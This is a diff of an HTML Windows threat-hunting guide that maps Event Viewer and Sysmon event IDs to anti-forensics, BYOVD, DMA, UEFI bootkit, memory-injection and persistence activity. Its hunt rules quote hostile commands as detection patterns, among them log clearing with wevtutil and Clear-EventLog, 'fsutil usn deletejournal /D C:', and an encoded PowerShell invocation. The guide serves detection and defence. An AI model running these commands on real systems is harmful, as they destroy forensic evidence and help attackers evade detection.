-                        <li><strong>Install Sysmon:</strong> Download from Sysinternals, use a robust config (like SwiftOnSecurity), and run <code>sysmon.exe -accepteula -i sysmonconfig.xml</code>.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <div id="tab-antiforensics" class="tab-pane">
-                <h2>Module 1: Anti-Forensics, Timestomping & Evasion</h2>
-                <p>Advanced malware, sophisticated cheats, and human operators will actively attempt to blind your telemetry before executing their primary payload.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 1102</span>
-                        <span class="eid-badge eid-danger">Event ID 104</span>
-                        <h3>Audit Logs Wiped</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > Security (1102) & System (104)</div>
-                    <p><strong>What it is:</strong> The system or security event log was explicitly cleared.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS (Suspicious):</strong> Normal users and standard IT operations almost never clear the security log manually. If <code>1102</code> fires, you are actively breached or a rootkit is attempting to hide its installation trail.
-                    </div>
-                    <h4>Deep Analysis Steps:</h4>
-                    <ul class="step-list">
-                        <li>Open the event and look at the <strong>Subject: Account Name</strong> and <strong>Account Domain</strong>. This tells you which user context was compromised to issue the clear command.</li>
-                        <li>Immediately pivot to Sysmon or EDR telemetry to look for tools like <code>wevtutil cl System</code> or PowerShell commands like <code>Clear-EventLog</code> executing just prior to the wipe.</li>
-                    </ul>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-warning">Event ID 4616</span>
-                        <h3>System Time Manipulation</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > Security</div>
-                    <p><strong>What it is:</strong> The system clock was changed.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> Known as "Timestomping." Advanced attackers roll back the system clock to a date when a leaked, malicious code-signing certificate was still valid. This allows them to load a Ring-0 kernel driver without triggering Driver Signature Enforcement (DSE).
-                    </div>
-                    <p><strong>Hunt Rule:</strong> Filter out `SubjectLogonId` for `LOCAL SERVICE` (which is standard NTP time sync). If a user account or an unknown executable initiates the time change, investigate immediately.</p>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 4688</span>
-                        <h3>USN Journal Manipulation</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > Security</div>
-                    <p><strong>What it is:</strong> Process Creation log. You are hunting for specific command-line arguments targeting the NTFS file system tracking.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> The Update Sequence Number (USN) journal tracks every file dropped or deleted on the drive. Malware clears this to prevent forensic analysts from finding the payload origin.
-                    </div>
-                    <p><strong>Hunt Rule:</strong> Filter ID 4688 and search the <strong>Process Command Line</strong> for: <code>fsutil usn deletejournal /D C:</code></p>
-                </div>
-            </div>
-
-            <div id="tab-hardware" class="tab-pane">
-                <h2>Module 2: USB, PCI, and DMA Hardware Attacks</h2>
-                <p>Physical vectors bypass software firewalls completely. This includes malicious USB drops (Rubber Duckies) and PCIe screamer cards used by high-end espionage and game cheats to read physical RAM via Direct Memory Access (DMA).</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-info">Event ID 2003 / 2100</span>
-                        <span class="eid-badge eid-info">Event ID 400 / 410</span>
-                        <h3>Reliable USB / Device Plug & Unplug</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > DriverFrameworks-UserMode > Operational (2003/2100)</div>
-                    <div class="log-path">App & Services > Microsoft > Windows > Kernel-PnP > Configuration (400/410)</div>
-                    <p><strong>What it is:</strong> The most reliable way to track device connections. <code>2003/400</code> means plugged in/configured. <code>2100/410</code> means unplugged/removed.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> You are looking for mismatched hardware profiles. If a user inserts a "USB Flash Drive", but Event Viewer registers a new Human Interface Device (HID) keyboard that immediately executes 500 keystrokes, you have found a malicious payload delivery device.
-                    </div>
-                    <h4>Deep Analysis Steps:</h4>
-                    <ul class="step-list">
-                        <li>Look at the <strong>Instance ID</strong> in the log. It will contain the Vendor ID (VID) and Product ID (PID), e.g., <code>USB\VID_045E&PID_07B2</code>.</li>
-                        <li>Search that VID/PID online. If the log says it's a storage device but the VID maps to a generic keyboard controller, it's forged hardware.</li>
-                    </ul>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 4122 / 4123</span>
-                        <h3>Unprotected DMA Device (PCIe Screamers)</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > BitLocker-API > Management</div>
-                    <p><strong>What it is:</strong> Windows detected a device plugged into a high-speed bus (PCIe/Thunderbolt) that is capable of Direct Memory Access (DMA), but the system's IOMMU (Kernel DMA Protection) failed to protect the memory.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> DMA cards are external PCI devices that read/write system RAM directly, bypassing the CPU and OS entirely. This is heavily used by custom firmware cheats and advanced rootkits.
-                    </div>
-                    <p><strong>Hunt Rule:</strong> Custom DMA cards often try to spoof legitimate devices. If you see ID 4122 triggered by a device claiming to be a generic "Intel Wi-Fi Adapter" that was just plugged into a PCIe slot, physical memory is being scraped.</p>
-                </div>
-            </div>
-
-            <div id="tab-uefi" class="tab-pane">
-                <h2>Module 3: UEFI Bootkits, Secure Boot & Database Auditing</h2>
-                <p>If malware loads before the OS kernel starts (via the UEFI), it owns the entire system. It can patch the Windows loader in memory, bypassing all subsequent security measures.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-info">Event ID 1801 / 1802</span>
-                        <h3>TPM-WMI: Secure Boot Certificate Updates</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > System</div>
-                    <p><strong>What it is:</strong> Windows Update downloaded new Secure Boot databases (DB/DBX) to protect against UEFI bootkits like BlackLotus. ID 1801 means the certificates are pending; the firmware has not accepted them into NVRAM yet.</p>
-                    
-                    <div class="alert alert-def">
-                        <strong>The Absolute Truth Test (PowerShell Validation):</strong><br>
-                        Event Viewer only tells you the OS <em>tried</em> to update the keys. To know if you are actually protected, you must interrogate the UEFI memory directly. Open an Admin PowerShell and run:
-                        <pre><code>([System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI db).bytes) -match 'Windows UEFI CA 2023')</code></pre>
-                    </div>
-                    
-                    <h4>Deciphering the PowerShell Output:</h4>
-                    <table>
-                        <tr>
-                            <th>Output</th>
-                            <th>Meaning</th>
-                            <th>Security Posture</th>
-                        </tr>
-                        <tr>
-                            <td><code>True</code></td>
-                            <td>The motherboard firmware successfully wrote the new 2023 Microsoft certificates to the physical NVRAM.</td>
-                            <td><strong>Secure.</strong> The system will block compromised/leaked Windows bootloaders.</td>
-                        </tr>
-                        <tr>
-                            <td><code>False</code></td>
-                            <td>The firmware rejected the update or requires a physical BIOS flash/factory key reset to accept it.</td>
-                            <td><strong>Critically Vulnerable.</strong> The system is running the 2011 keys and is exposed to the BlackLotus bootkit and BYOVD downgrades.</td>
-                        </tr>
-                    </table>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 3033</span>
-                        <h3>Code Integrity Check Failure (Fake Signatures)</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > CodeIntegrity > Operational</div>
-                    <p><strong>What it is:</strong> Windows Driver Signature Enforcement (DSE) blocked a file from loading because its cryptographic signature was invalid, revoked, or non-existent.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> Attackers steal certificates from legitimate software companies to sign their malware. When those certs are discovered and revoked by Microsoft (placed in the DBX), ID 3033 fires when the malware tries to run.
-                    </div>
-                </div>
-            </div>
-
-            <div id="tab-kernel" class="tab-pane">
-                <h2>Module 4: Kernel Drivers (Ring-0) & BYOVD</h2>
-                <p>To execute devastating actions like hiding processes or unhooking EDR sensors, malware must elevate to Ring-0 (the Kernel).</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 7045</span>
-                        <span class="eid-badge eid-danger">Event ID 4697</span>
-                        <h3>New Service / Kernel Driver Installed</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > System (7045) & Security (4697)</div>
-                    <p><strong>What it is:</strong> A new service, often a <code>.sys</code> kernel driver, was registered with the Windows Service Control Manager (SCM).</p>
-                    
-                    <div class="alert alert-sus">
-                        <strong>Bring Your Own Vulnerable Driver (BYOVD):</strong><br>
-                        Attackers know unsigned drivers are blocked. Instead, they drop a legitimately signed, but severely outdated and vulnerable driver (e.g., an old version of `capcom.sys` or an Intel diagnostic tool). They install it (triggering 7045), then exploit it to map their own unsigned malicious code into kernel space.
-                    </div>
-
-                    <h4>Deep Analysis Steps:</h4>
-                    <ul class="step-list">
-                        <li>Examine the <strong>ImagePath</strong>. Legitimate drivers live in <code>C:\Windows\System32\drivers\</code>.</li>
-                        <li>If the ImagePath is <code>C:\Windows\Temp\random.sys</code>, <code>C:\Users\Public\driver.sys</code>, or hidden in an <code>AppData</code> subfolder, it is a massive red flag.</li>
-                        <li>Check the <strong>Service Type</strong>. If it says <code>kernel mode driver</code> and the source is unknown, isolate the machine.</li>
-                    </ul>
-                </div>
-            </div>
-
-            <div id="tab-memory" class="tab-pane">
-                <h2>Module 5: Memory Injections & Thread Hijacking</h2>
-                <p>This module requires Sysmon. Advanced threats do not write <code>malware.exe</code> to disk. They inject custom C++ payloads directly into the live memory of legitimate processes (like <code>explorer.exe</code> or a running video game to draw an ImGui overlay).</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Sysmon ID 10</span>
-                        <h3>Process Access (Thread Suspension & Manipulation)</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > Sysmon > Operational</div>
-                    <p><strong>What it is:</strong> One process requested a handle to open another process's memory space using the Windows <code>OpenProcess</code> API.</p>
-                    
-                    <h4>The Hexadecimal Access Mask Decorder Ring:</h4>
-                    <p>When you look at the event, find the <strong>GrantedAccess</strong> field. This hex code tells you exactly what the attacker's C++ code is trying to do to the victim process.</p>
-                    <table>
-                        <tr>
-                            <th>Access Mask (Hex)</th>
-                            <th>Windows API Constant</th>
-                            <th>Forensic Meaning / Malicious Use Case</th>
-                        </tr>
-                        <tr>
-                            <td><code>0x1FFFFF</code></td>
-                            <td><code>PROCESS_ALL_ACCESS</code></td>
-                            <td><strong>God Mode.</strong> The tool is trying to completely control the target. Often seen when Mimikatz targets <code>lsass.exe</code> to dump passwords.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0x0008</code></td>
-                            <td><code>PROCESS_VM_OPERATION</code></td>
-                            <td><strong>Memory Hooking.</strong> Required to use <code>VirtualAllocEx</code>. The attacker is allocating space inside the target process to write their payload.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0x0020</code></td>
-                            <td><code>PROCESS_VM_WRITE</code></td>
-                            <td><strong>Payload Delivery.</strong> The attacker is calling <code>WriteProcessMemory</code> to insert the malicious bytes into the allocated space.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0x0010</code></td>
-                            <td><code>PROCESS_VM_READ</code></td>
-                            <td><strong>Data Scraping.</strong> The tool is reading memory arrays. Commonly used by external cheats reading player coordinates from a game client matrix.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0x0800</code></td>
-                            <td><code>PROCESS_SUSPEND_RESUME</code></td>
-                            <td><strong>Thread Freezing.</strong> The attacker calls <code>SuspendThread</code> to freeze the process, uses <code>SetThreadContext</code> to point the execution to their injected payload, and calls <code>ResumeThread</code>.</td>
-                        </tr>
-                    </table>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> Legitimate programs rarely need <code>PROCESS_ALL_ACCESS</code> or <code>PROCESS_VM_WRITE</code> handles to other running programs. 
-                    </div>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Sysmon ID 8</span>
-                        <h3>CreateRemoteThread (Code Execution)</h3>
-                    </div>
-                    <p><strong>What it is:</strong> Detects the final stage of injection. After allocating memory and writing the payload (ID 10), the attacker calls <code>CreateRemoteThread</code> to force the victim process to execute the malicious bytes.</p>
-                    <p><strong>Hunt Rule:</strong> Look at <strong>SourceImage</strong> vs <strong>TargetImage</strong>. If <code>powershell.exe</code> or a random background app (Source) creates a remote thread inside <code>winlogon.exe</code> or <code>notepad.exe</code> (Target), it is definitive proof of process hollowing or DLL injection.</p>
-                </div>
-            </div>
-
-            <div id="tab-fileless" class="tab-pane">
-                <h2>Module 6: PowerShell & Fileless Execution</h2>
-                <p>Living-off-the-Land (LotL) attacks use native system administration tools to execute code, avoiding the drop of an easily detectable `.exe` file.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-warning">Event ID 4104</span>
-                        <h3>PowerShell Script Block Logging</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > PowerShell > Operational</div>
-                    <p><strong>What it is:</strong> Captures the full content of PowerShell code blocks as they are executed. Crucially, it captures the code <em>after</em> it has been unrolled and de-obfuscated in memory.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> Fileless malware exists entirely as a giant encoded string passed directly to the shell. ID 4104 will reveal the true intentions of the script.
-                    </div>
-                    <h4>Keywords to Hunt For in the ScriptBlockText:</h4>
-                    <ul class="step-list">
-                        <li><code>FromBase64String</code>: The attacker is unpacking a hidden payload.</li>
-                        <li><code>[System.Runtime.InteropServices.Marshal]::Copy</code>: C# reflection used to copy bytes directly into memory.</li>
-                        <li><code>VirtualAlloc</code> or <code>WriteProcessMemory</code>: The PowerShell script is actively performing memory injection (see Module 5) without needing a compiled C++ `.exe`.</li>
-                        <li><code>System.Reflection.Assembly.Load</code>: Loading a malicious .NET DLL straight into RAM.</li>
-                    </ul>
-                </div>
-                
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-info">Event ID 4688</span>
-                        <h3>Command Line Obfuscation</h3>
-                    </div>
-                    <p>Look at the process creation command line for extreme obfuscation tactics. E.g., <code>cmd.exe /c "set x=powershell&& call %x% -enc JABz..."</code>. The use of carets (<code>^</code>), environmental variable slicing, or `-enc` (EncodedCommand) are hallmarks of an evasion attempt.</p>
-                </div>
-            </div>
-
-            <div id="tab-persistence" class="tab-pane">
-                <h2>Module 7: Persistence & Scheduled Tasks</h2>
-                <p>Once memory is injected or a rootkit is loaded, it must survive a system reboot. Attackers blend in with background noise.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-warning">Event ID 4698</span>
-                        <h3>Scheduled Task Created</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > Security</div>
-                    <p><strong>What it is:</strong> A new task was registered with the Windows Task Scheduler.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> Attackers create tasks that trigger "On Logon" or "On Idle". They will name the task something deceptive like <code>WindowsUpdateCore</code> or <code>GoogleCrashHandler</code>.
-                    </div>
-                    <h4>Deep Analysis Steps:</h4>
-                    <ul class="step-list">
-                        <li>Open the event log and scroll down to the <strong>Event XML</strong> data.</li>
-                        <li>Find the <code>&lt;Command&gt;</code> and <code>&lt;Arguments&gt;</code> tags.</li>
-                        <li>If the task is named "AdobeUpdate" but the command is <code>wscript.exe</code> launching a <code>.vbs</code> file from <code>C:\ProgramData\</code>, it's persistence.</li>
-                    </ul>
-                </div>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-info">Event ID 5861</span>
-                        <h3>WMI Activity (Advanced Persistence)</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > WMI-Activity > Operational</div>
-                    <p>Advanced adversaries use Windows Management Instrumentation (WMI) Event Consumers. They write a script directly into the WMI repository that triggers automatically when a specific system event occurs (e.g., when a specific process starts or the system has been up for 5 minutes). This is incredibly stealthy as there are no files on disk and no scheduled tasks to find.</p>
-                </div>
-            </div>
-
-            <div id="tab-network" class="tab-pane">
-                <h2>Module 8: Web Requests & C2 Beacons</h2>
-                <p>Malware must phone home to its Command and Control (C2) server to receive instructions or exfiltrate data. Native logging struggles with process-to-network attribution, so we rely on Sysmon.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-info">Sysmon ID 22</span>
-                        <span class="eid-badge eid-warning">Sysmon ID 3</span>
-                        <h3>DNS Queries & Network Connections</h3>
-                    </div>
-                    <div class="log-path">App & Services > Microsoft > Windows > Sysmon > Operational</div>
-                    <p><strong>What it is:</strong> ID 22 tracks which process asked to resolve a domain name. ID 3 tracks the exact IP, port, and process that established an outbound connection.</p>
-                    <div class="alert alert-sus">
-                        <strong>Why it's SUS:</strong> This is how you catch Process Hollowing. If <code>notepad.exe</code>, <code>calc.exe</code>, or <code>svchost.exe</code> (running from the wrong directory) suddenly resolves a strange domain (ID 22) and opens a TCP port 443 connection to an unknown IP in Russia (ID 3), you have found your C2 beacon.
-                    </div>
-                    <p><strong>Hunt Rule:</strong> Look for "Beaconing" behavior. If a process initiates a Sysmon ID 3 connection to the exact same IP address exactly every 5 minutes and 30 seconds (with some jitter), that is an automated malware callback, not a human browsing the web.</p>
-                </div>
-            </div>
-
-            <div id="tab-crashes" class="tab-pane">
-                <h2>Module 9: Crashed Files & Bad Pointers</h2>
-                <p>Attackers make mistakes. Poorly written C++ malware, broken game cheats, or improperly configured ImGui overlays frequently fail when trying to hook into memory, resulting in target process crashes.</p>
-
-                <div class="event-card">
-                    <div class="event-header">
-                        <span class="eid-badge eid-danger">Event ID 1000</span>
-                        <span class="eid-badge eid-info">Event ID 1001</span>
-                        <h3>Application Error (AppCrash)</h3>
-                    </div>
-                    <div class="log-path">Windows Logs > Application</div>
-                    <p><strong>What it is:</strong> ID 1000 logs the exact faulting module that caused a process to unexpectedly terminate. ID 1001 logs the Windows Error Reporting (WER) bucket data.</p>
-                    
-                    <h4>Deciphering the Exception Codes:</h4>
-                    <table>
-                        <tr>
-                            <th>Exception Code</th>
-                            <th>Technical Meaning</th>
-                            <th>Forensic Implication</th>
-                        </tr>
-                        <tr>
-                            <td><code>0xc0000005</code></td>
-                            <td><strong>Access Violation</strong></td>
-                            <td>The #1 indicator of a failed memory injection. A foreign `.dll` or injected thread attempted to read or write to a memory address it didn't have permission for, or the pointer was null/invalid. Common with broken overlays or outdated C++ hooks.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0xc0000374</code></td>
-                            <td><strong>Heap Corruption</strong></td>
-                            <td>The injected payload mismanaged memory allocation, overwriting critical data structures in the target process.</td>
-                        </tr>
-                        <tr>
-                            <td><code>0xc0000409</code></td>
-                            <td><strong>Stack Buffer Overrun</strong></td>
-                            <td>Often seen during active exploitation attempts where an attacker sends a payload too large for the buffer, triggering stack protection (GS cookies) which safely kills the app.</td>
-                        </tr>
-                    </table>
-
-                    <div class="alert alert-sus">
-                        <strong>The Smoking Gun:</strong><br>
-                        Look at the <strong>Faulting Module Name</strong>. If an application like <code>Discord.exe</code> crashes (0xc0000005), and the Faulting Module Name is an unknown `.dll` file sitting in <code>C:\Users\Name\AppData\Local\Temp\hook.dll</code>, you have just found the exact malicious payload that attempted (and failed) to inject itself.
-                    </div>
-                </div>
-            </div>
-
+      <!-- 3: ANTI-FORENSICS -->
+      <div id="ev-antiforensics" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-eraser"></i> Module 3: Anti-Forensics &amp; Log Clearing</h2>
+          <span class="eid eid-danger">Event ID 1102</span><span class="eid eid-danger">Event ID 104</span>
+          <span class="log-path">Windows Logs &gt; Security (1102) | System (104)</span>
+          <p><strong>1102</strong> = Security log cleared by a user account. <strong>104</strong> = System log cleared. Both are atomic evidence of compromise or insider threat.</p>
+          <div class="alert alert-sus"><strong>Why It's Critical:</strong> Normal enterprise environments almost never manually clear these logs. A single 1102 event is probable cause for a full incident response. Look at <code>Subject: Account Name</code> — the account that cleared it is either compromised or malicious.</div>
+          <h3>What to Do After Seeing 1102</h3>
+          <ul class="step-list">
+            <li>Note the timestamp and the clearing account.</li>
+            <li>Pivot to Sysmon or EDR: look for <code>wevtutil cl Security</code>, <code>wevtutil cl System</code>, or <code>Clear-EventLog</code> PowerShell in a 4688/Sysmon 1 record immediately before.</li>
+            <li>Check <strong>USN Journal</strong> for file deletions in <code>C:\Windows\System32\winevt\Logs\</code> around the same timestamp.</li>
+            <li>Check Shadow Copies (<code>vssadmin list shadows</code>) for pre-wipe snapshots.</li>
+          </ul>
+          <h3>USN Journal Deletion via Process Creation</h3>
+          <span class="eid eid-danger">Event ID 4688</span>
+          <p>Filter 4688 and search <code>Process Command Line</code> for: <code>fsutil usn deletejournal /D C:</code>. This destroys the NTFS change log, preventing you from knowing what files were created, modified, or deleted.</p>
         </div>
+      </div>
+
+      <!-- 4: TIMESTOMPING -->
+      <div id="ev-timestomp" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-clock"></i> Module 4: Timestomping &amp; Time Manipulation</h2>
+          <span class="eid eid-warn">Event ID 4616</span>
+          <span class="log-path">Windows Logs &gt; Security</span>
+          <p>Attackers manipulate the system clock to exploit leaked code-signing certificates that have since been revoked. By rolling back time to when the cert was valid, they can load unsigned kernel drivers without triggering Driver Signature Enforcement (DSE).</p>
+          <div class="alert alert-sus"><strong>Filter Rule:</strong> Exclude <code>SubjectLogonId</code> with value <code>LOCAL SERVICE</code> (that is normal NTP sync). Any user account or unknown process initiating a time change is a red flag.</div>
+          <h3>Correlating Timestomping with BYOVD</h3>
+          <ul class="step-list">
+            <li>Spot <strong>4616</strong> showing clock rolled back 2–5 years.</li>
+            <li>Within minutes, look for <strong>7045</strong> (new driver installed) — the signed-but-expired driver loads successfully.</li>
+            <li>Then clock resets forward — another <strong>4616</strong> — to avoid detection.</li>
+          </ul>
+          <h3>File Timestomping (MFT vs STANDARD_INFORMATION)</h3>
+          <p>Attackers use tools like <code>timestomp.exe</code> to modify <code>$STANDARD_INFORMATION</code> timestamps in the MFT. However, <code>$FILE_NAME</code> timestamps cannot be changed from user-mode — a discrepancy between the two is definitive proof of tampering. See the <strong>MFT</strong> tab for deep analysis.</p>
+        </div>
+      </div>
+
+      <!-- 5: USB -->
+      <div id="ev-usb" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-usb"></i> Module 5: USB &amp; Device Plug / Unplug</h2>
+          <span class="eid eid-info">Event ID 2003 / 2100</span><span class="eid eid-info">Event ID 400 / 410</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; DriverFrameworks-UserMode &gt; Operational (2003/2100)</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; Kernel-PnP &gt; Configuration (400/410)</span>
+          <table>
+            <tr><th>Event ID</th><th>Meaning</th></tr>
+            <tr><td><code>2003 / 400</code></td><td>Device plugged in and configured.</td></tr>
+            <tr><td><code>2100 / 410</code></td><td>Device removed / unplugged.</td></tr>
+          </table>
+          <h3>Identifying Malicious USB Devices</h3>
+          <ul class="step-list">
+            <li>Extract the <strong>Instance ID</strong> from the log — it contains <code>VID_xxxx&amp;PID_xxxx</code>.</li>
+            <li>Cross-reference at <a href="https://the-sz.com/products/usbid/" target="_blank" class="tool-link"><i class="fas fa-external-link-alt"></i> USB ID Database</a> — if VID maps to a keyboard controller but the device was presented as a Flash Drive, it's a BadUSB / Rubber Ducky.</li>
+            <li>Correlate plug time with <strong>4688</strong> events immediately after — HID injection payloads execute within 1–2 seconds of plug-in.</li>
+          </ul>
+          <div class="alert alert-sus"><strong>Key Indicator:</strong> A "USB Flash Drive" appearing as a HID keyboard device that spawns <code>cmd.exe</code> or <code>powershell.exe</code> within 2 seconds of plug-in = guaranteed BadUSB attack.</div>
+        </div>
+      </div>
+
+      <!-- 6: DMA -->
+      <div id="ev-dma" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-microchip"></i> Module 6: DMA / PCIe Hardware Attacks</h2>
+          <span class="eid eid-danger">Event ID 4122 / 4123</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; BitLocker-API &gt; Management</span>
+          <p>Direct Memory Access (DMA) attacks use a PCIe device (Screamer card, Thunderbolt device, custom FPGA) that physically reads and writes system RAM without CPU involvement — completely bypassing all OS-level security controls.</p>
+          <table>
+            <tr><th>Event</th><th>Meaning</th></tr>
+            <tr><td><span class="eid eid-danger">4122</span></td><td>A DMA-capable device was connected to a PCIe/Thunderbolt port and the IOMMU (Kernel DMA Protection) was <strong>not active</strong> — memory is exposed.</td></tr>
+            <tr><td><span class="eid eid-warn">4123</span></td><td>DMA-capable device connected but IOMMU <strong>is active</strong> — protected, but still note the device.</td></tr>
+          </table>
+          <div class="alert alert-sus"><strong>DMA Cheat Kit Detection:</strong> Custom PCIe DMA cards (used for game cheating and espionage) spoof legitimate device IDs. If you see 4122 triggered by a device claiming to be "Intel Wi-Fi 6 AX200" but it was just physically inserted into a PCIe slot mid-session with no reboot, it is a DMA card reading RAM.</div>
+          <h3>Additional DMA Artifact Correlation</h3>
+          <ul class="step-list">
+            <li>Check <strong>Kernel-PnP</strong> logs (Event 400/410) for the PCIe device's hardware ID and plug/unplug timestamps.</li>
+            <li>Check <strong>Sysmon ID 6</strong> (Driver Load) for any new driver that loaded around the same time.</li>
+            <li>Check <strong>System event 7045</strong> for a new service registered to manage the DMA card's firmware communication component.</li>
+          </ul>
+          <h3>Checking IOMMU / Kernel DMA Protection Status</h3>
+          <div class="cmd-block"><code>msinfo32.exe</code> → System Summary → Look for <strong>Kernel DMA Protection: ON</strong></div>
+          <div class="cmd-block"><code>(Get-CimInstance Win32_DeviceGuard).VirtualizationBasedSecurityStatus</code></div>
+        </div>
+      </div>
+
+      <!-- 7: UEFI -->
+      <div id="ev-uefi" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-shield-alt"></i> Module 7: UEFI Bootkits &amp; Secure Boot</h2>
+          <span class="eid eid-info">Event ID 1801 / 1802</span><span class="eid eid-danger">Event ID 3033</span>
+          <span class="log-path">Windows Logs &gt; System (1801/1802) | Apps &amp; Services &gt; CodeIntegrity &gt; Operational (3033)</span>
+          <table>
+            <tr><th>Event</th><th>Meaning</th></tr>
+            <tr><td><span class="eid eid-info">1801</span></td><td>Windows Update pushed new Secure Boot DB/DBX — update is pending in NVRAM.</td></tr>
+            <tr><td><span class="eid eid-info">1802</span></td><td>Update successfully written to UEFI NVRAM.</td></tr>
+            <tr><td><span class="eid eid-danger">3033</span></td><td>Driver Signature Enforcement (DSE) blocked a file — invalid, revoked, or missing signature.</td></tr>
+          </table>
+          <h3>Validate Secure Boot Certificates (PowerShell)</h3>
+          <div class="cmd-block"><code>([System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI db).bytes) -match 'Windows UEFI CA 2023')</code></div>
+          <table>
+            <tr><th>Output</th><th>Security Status</th></tr>
+            <tr><td><code>True</code></td><td>Protected. 2023 Microsoft CA in NVRAM — BlackLotus variants blocked.</td></tr>
+            <tr><td><code>False</code></td><td>Critically Vulnerable. Still using 2011 keys. Exposed to BlackLotus and BYOVD downgrade attacks.</td></tr>
+          </table>
+          <div class="alert alert-sus"><strong>Event ID 3033:</strong> Attackers steal certificates from legitimate companies to sign malware. When those certs are revoked (added to DBX), 3033 fires when the malware attempts to load. This is your smoking gun for a signed-but-revoked payload.</div>
+        </div>
+      </div>
+
+      <!-- 8: KERNEL -->
+      <div id="ev-kernel" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-layer-group"></i> Module 8: Kernel Drivers &amp; BYOVD</h2>
+          <span class="eid eid-danger">Event ID 7045</span><span class="eid eid-danger">Event ID 4697</span><span class="eid eid-danger">Sysmon ID 6</span>
+          <span class="log-path">System (7045) | Security (4697) | Sysmon (ID 6)</span>
+          <table>
+            <tr><th>Event</th><th>Meaning</th><th>Critical Fields</th></tr>
+            <tr><td>7045 / 4697</td><td>New service/driver registered</td><td>ImagePath, ServiceType, AccountName</td></tr>
+            <tr><td>Sysmon 6</td><td>Driver loaded (with signature status)</td><td>ImageLoaded, Signed, Signature, Hashes</td></tr>
+          </table>
+          <h3>Analysis Process</h3>
+          <ul class="step-list">
+            <li>Note the <code>ImagePath</code>. Legitimate drivers: <code>C:\Windows\System32\drivers\</code>. Malicious: <code>%TEMP%</code>, <code>C:\Users\Public\</code>, <code>C:\ProgramData\</code>.</li>
+            <li>Check <code>Service Type</code> = <em>kernel mode driver</em> from an unknown source = immediate escalation.</li>
+            <li>Cross-reference the driver hash against <a href="https://loldrivers.io" target="_blank" class="tool-link"><i class="fas fa-external-link-alt"></i> LOLDrivers.io</a> — database of known-vulnerable legitimate drivers used in BYOVD attacks.</li>
+            <li>In Sysmon ID 6: <code>Signed: false</code> on a kernel driver = DSE disabled or TestSigning mode active.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 9: MEMORY -->
+      <div id="ev-memory" class="ev-section" style="display:none;">
+        <div class="card">
+          <h2><i class="fas fa-memory"></i> Module 9: Memory Injections &amp; Thread Hijacking</h2>
+          <span class="eid eid-danger">Sysmon ID 10</span><span class="eid eid-danger">Sysmon ID 8</span>
+          <span class="log-path">Apps &amp; Services &gt; Microsoft &gt; Windows &gt; Sysmon &gt; Operational</span>
+          <h3>Sysmon ID 10 — ProcessAccess (GrantedAccess Decoder)</h3>
+          <table>
+            <tr><th>Hex Mask</th><th>API Constant</th><th>Forensic Meaning</th></tr>
+            <tr><td><code>0x1FFFFF</code></td><td>PROCESS_ALL_ACCESS</td><td>Full control — Mimikatz targeting LSASS, cheat engine targeting game.</td></tr>
